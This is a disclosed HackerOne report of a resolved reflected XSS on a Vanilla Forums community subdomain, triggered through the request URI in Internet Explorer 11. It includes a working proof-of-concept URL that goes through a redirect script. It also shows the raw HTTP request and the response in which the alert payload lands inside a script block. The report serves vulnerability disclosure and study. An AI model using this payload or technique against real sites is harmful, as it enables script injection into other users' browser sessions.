---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '386112'
original_report_id: '386112'
title: '[allhiphop.vanillacommunities.com] XSS Request-URI'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: vanilla
created_at: '2018-07-24T05:59:16.973Z'
disclosed_at: '2018-11-18T07:07:02.823Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 28
asset_identifier: '*.vanillacommunities.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [allhiphop.vanillacommunities.com] XSS Request-URI

## Metadata

- HackerOne Report ID: 386112
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: vanilla
- Disclosed At: 2018-11-18T07:07:02.823Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Reflected XSS via Request-URI for Internet Explorer.

## Steps to reproduce:

1. Open URL in Internet Explorer (tested on IE 11)

```
https://blackfan.ru/x?r=https://allhiphop.vanillacommunities.com/xxx%22-alert(document.domain)-%22xxx/%252e%252e/
```
blackfan.ru/x - a simple redirection script that is needed to send a request-path without a urlencode.

**HTTP Request**
```http
GET /xxx"-alert(123)-"xxx/%2e%2e/ HTTP/1.1
Host: allhiphop.vanillacommunities.com
```

**HTTP Response**
```html
<script>
   COMSCORE.beacon({
      c1:2,
      c2:6685975,
      c3:"",
      c4:"app6.cl411.vanilladev.com/xxx"-alert(123)-"xxx/%2e%2e/",
      c5:"",
      c6:"",
      c15:""
   });
   </script>
```

## Impact

Reflected XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
